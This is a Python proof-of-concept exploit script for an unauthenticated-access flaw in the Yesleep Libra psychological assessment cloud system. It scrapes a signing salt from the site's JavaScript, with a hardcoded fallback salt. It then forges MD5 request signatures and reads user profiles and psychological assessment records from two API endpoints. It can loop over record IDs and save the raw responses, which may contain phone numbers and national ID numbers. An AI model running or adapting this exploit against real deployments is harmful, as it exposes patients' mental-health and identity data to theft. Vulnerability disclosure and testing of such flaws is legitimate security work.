#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Psychological CT Cloud System (Yesleep Libra) - Unauthenticated Access PoC

Usage:
    python Poc.py -u http://TARGET:8800 -kw 11 -id 11

    python Poc.py -u http://TARGET:8800 -kw 11,12,20 -id 11,12,20
    python Poc.py -u http://TARGET:8800 -kw 20 -id 20 --mask
    python Poc.py -u http://TARGET:8800 -kw 20 -id 20 --proxy http://127.0.0.1:7890

Notes:
  * The signing salt is extracted automatically from the front-end bundle
    /static/js/app.*.js; if extraction fails, it falls back to the built-in
    saltjvTucz3EOg3F.
  * Supports both JSON and XML (<ResponseData>) gateway responses.
"""

import argparse
import contextlib
import hashlib
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET

SALT_FALLBACK = "saltjvTucz3EOg3F"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

RE_PHONE = re.compile(r"\b1[3-9]\d{9}\b")
RE_IDCARD = re.compile(r"\b\d{17}[\dXx]\b")


def mask_text(s):
    s = RE_PHONE.sub(lambda m: m.group(0)[:3] + "****" + m.group(0)[-4:], s)
    s = RE_IDCARD.sub(lambda m: m.group(0)[:6] + "********" + m.group(0)[-4:], s)
    return s


def opener_for(proxy):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers = [urllib.request.HTTPSHandler(context=ctx)]
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    else:
        handlers.append(urllib.request.ProxyHandler({}))
    return urllib.request.build_opener(*handlers)


def http_get(opener, url, headers=None, timeout=15, limit=4000000):
    hdr = {"User-Agent": UA}
    if headers:
        hdr.update(headers)
    req = urllib.request.Request(url, headers=hdr)
    with opener.open(req, timeout=timeout) as r:
        return r.status, r.read(limit)


def make_sign(params, ts, salt):
    """sign = md5( sorted key+value concatenation + 'timestamp' + ts + salt )"""
    joined = "".join(sorted(k + str(v) for k, v in params.items())) if params else ""
    plain = joined + "timestamp" + str(ts) + salt
    return hashlib.md5(plain.encode()).hexdigest(), plain


def fetch_salt(opener, base, timeout):
    """Locate app.*.js from the homepage, extract the salt, return (salt, js_path, source)."""
    try:
        _, body = http_get(opener, base + "/", timeout=timeout, limit=65536)
    except Exception as e:
        return SALT_FALLBACK, None, "homepage unreadable (%s), using built-in salt" % type(e).__name__
    html = body.decode("utf-8", "replace")
    m = re.search(r"/static/js/app\.[A-Za-z0-9]+\.js", html)
    if not m:
        return SALT_FALLBACK, None, "app.js not found on homepage, using built-in salt"
    js = m.group(0)
    try:
        _, jb = http_get(opener, base + js, timeout=timeout, limit=2000000)
    except Exception as e:
        return SALT_FALLBACK, js, "%s read failed (%s), using built-in salt" % (js, type(e).__name__)
    txt = jb.decode("utf-8", "replace")
    m2 = re.search(r"salt([A-Za-z0-9]{8,24})", txt)
    if m2:
        return "salt" + m2.group(1), js, "extracted from %s" % js
    return SALT_FALLBACK, js, "%s no salt matched, using built-in salt" % js


def get_code(text):
    """Extract the business code only for the verdict; never modify the raw text."""
    t = text.strip()
    if t.startswith("{"):
        try:
            return json.loads(t).get("code")
        except Exception:
            return None
    if t.startswith("<"):
        try:
            return ET.fromstring(t).findtext("code")
        except Exception:
            return None
    return None


def judge(code):
    cs = str(code) if code is not None else ""
    if cs == "0":
        return "UNAUTHORIZED READ (code=0, raw server response below)"
    if cs == "10200":
        return "PATCHED (10200 = not logged in or session expired)"
    if cs == "10100":
        return "SIGNATURE CHECK FAILED (salt may have changed, use --salt)"
    return "unexpected code=%s" % (cs or "-")


def run_one(opener, base, path, pname, val, salt, args):
    ts = int(time.time() * 1000)
    params = {pname: val}
    sign, plain = make_sign(params, ts, salt)
    url = "%s/api/%s?%s=%s" % (base, path, pname, val)

    print("\n" + "-" * 78)
    print("Endpoint: %s" % path)
    print("URL     : %s" % url)
    print("Sign plaintext: %s" % plain)
    print("Headers : sign: %s   t: %s   c: h5" % (sign, ts))
    print("-" * 78)

    try:
        _, body = http_get(opener, url,
                           headers={"sign": sign, "t": str(ts), "c": "h5"},
                           timeout=args.timeout)
    except urllib.error.HTTPError as e:
        print("[HTTP %s] request rejected" % e.code)
        return False
    except Exception as e:
        print("[FAILED] %s" % e)
        return False

    text = body.decode("utf-8", "replace")
    if args.mask:
        text = mask_text(text)
    print(text)
    print("-" * 78)

    code = get_code(text)
    ok = str(code) == "0"
    print("Code: %s    Verdict: %s" % (code if code is not None else "-", judge(code)))
    return ok


def split_ids(s):
    return [x.strip() for x in (s or "").split(",") if x.strip()]


class Tee(object):
    """Write to both console and a file to preserve raw evidence."""

    def __init__(self, *streams):
        self.streams = streams

    def write(self, s):
        for st in self.streams:
            st.write(s)
            st.flush()
        return len(s)

    def flush(self):
        for st in self.streams:
            st.flush()


def main():
    ap = argparse.ArgumentParser(
        description="Psychological CT Cloud System - Unauthenticated Access PoC "
                    "(prints full raw responses of both endpoints)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python Poc.py -u http://TARGET:8800 -kw 11 -id 11")
    ap.add_argument("-u", "--url", required=True, help="target base URL, e.g. http://TARGET:8800")
    ap.add_argument("-kw", "--kw", default="20", help="kw value for users/one, comma-separated for multiple")
    ap.add_argument("-id", "--id", default="20", help="id value for record-detail, comma-separated for multiple")
    ap.add_argument("--proxy", default=None, help="optional proxy, e.g. http://127.0.0.1:7890")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--salt", default=None, help="manually specify the salt (default: auto-extract from app.js)")
    ap.add_argument("--mask", action="store_true", help="mask phone numbers and national IDs in the output")
    ap.add_argument("-o", "--out", default=None, help="also write the full output to a file (UTF-8)")
    args = ap.parse_args()

    if args.out:
        with open(args.out, "w", encoding="utf-8-sig") as f, \
                contextlib.redirect_stdout(Tee(sys.stdout, f)):
            _run(args)
        print("Saved to: %s" % args.out)
    else:
        _run(args)


def _run(args):
    base = args.url.strip().rstrip("/")
    if not re.match(r"^https?://", base):
        base = "http://" + base
    opener = opener_for(args.proxy)

    print("=" * 78)
    print("Psychological CT Cloud System - Unauthenticated Access PoC")
    print("Target: %s    Proxy: %s" % (base, args.proxy or "direct"))
    print("=" * 78)

    if args.salt:
        salt, note = args.salt, "manually specified"
    else:
        salt, js, note = fetch_salt(opener, base, args.timeout)
    print("Salt: %s   (%s)" % (salt, note))

    kws, ids = split_ids(args.kw), split_ids(args.id)
    ok_u = ok_r = False

    for v in kws:
        if run_one(opener, base, "cfg/v1/users/one", "kw", v, salt, args):
            ok_u = True
    for v in ids:
        if run_one(opener, base, "scale/v1/scale/record-detail", "id", v, salt, args):
            ok_r = True

    print("\n" + "=" * 78)
    print("Result: users/one=%s   record-detail=%s" %
          ("unauthenticated read" if ok_u else "no data retrieved",
           "unauthenticated read" if ok_r else "no data retrieved"))
    if not (ok_u or ok_r):
        print("Hint: 10200 = this deployment is patched; 10100 = salt may have changed, use --salt;")
        print("      code=0 but empty data = endpoint unauthenticated but this ID has no record, try another ID.")
    print("=" * 78)


if __name__ == "__main__":
    main()
